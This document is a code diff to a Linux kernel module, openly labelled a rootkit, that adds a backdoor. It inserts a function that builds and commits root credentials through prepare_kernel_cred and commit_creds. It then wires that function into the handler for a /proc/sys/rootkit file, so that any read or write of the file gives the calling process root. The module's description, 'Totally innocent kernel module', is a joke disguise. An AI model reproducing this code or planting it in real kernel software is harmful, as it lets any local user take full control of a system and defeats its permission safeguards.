@@ -2,6 +2,7 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/kallsyms.h>
+#include <linux/cred.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Nobody important");
@@ -9,6 +10,16 @@ MODULE_DESCRIPTION("Totally innocent kernel module");
 MODULE_VERSION("1.0");
 
 #define log(...) printk(KERN_INFO "rootkit: " __VA_ARGS__)
+
+// Grants the calling process root permissions
+static int sysctl_escalate(void)
+{
+    struct cred *cred = prepare_kernel_cred(NULL);
+    if (cred == NULL) {
+        return -1;
+    }
+    return commit_creds(cred);
+}
 
 // Gets called when a read/write to the /proc/sys/rootkit
 // file occurs.
@@ -22,6 +33,13 @@ static int sysctl_handler(
     size_t *lenp,
     loff_t *ppos)
 {
+    // After doing anything to the file, you should have
+    // root permissions
+    if (sysctl_escalate() < 0) {
+        return -1;
+    }
+
+    log("len=%d, pos=%d\n", (int)*lenp, (int)*ppos);
     log("%s\n", (write) ? "write" : "read");
     return 0;
 }
